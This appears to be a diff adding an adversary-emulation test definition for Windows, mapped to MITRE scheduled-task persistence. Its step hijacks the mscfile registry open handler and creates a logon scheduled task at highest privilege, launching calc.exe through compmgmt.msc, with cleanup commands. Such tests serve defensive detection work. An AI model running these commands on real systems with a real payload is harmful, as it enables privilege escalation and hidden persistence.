@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Scheduled Task Persistence via CompMgmt.msc
+description: "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.\n"
+args:
+    - name: task_name
+      type: string
+      default: CompMgmtBypass
+    - name: payload
+      type: string
+      default: calc.exe
+uuid: 8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1053: Scheduled Task/Job'
+    subtechniques:
+        - 'T1053.005: Scheduled Task'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: scheduled-task-persistence-via-compmgmt.msc
+      inline: |
+        reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\{{.Args.payload}}" /f
+        schtasks /Create /TN "{{.Args.task_name}}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
+        ECHO Let's open the Computer Management console now...
+        compmgmt.msc
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
+            schtasks /Delete /TN "{{.Args.task_name}}" /F
+        executor: command_prompt
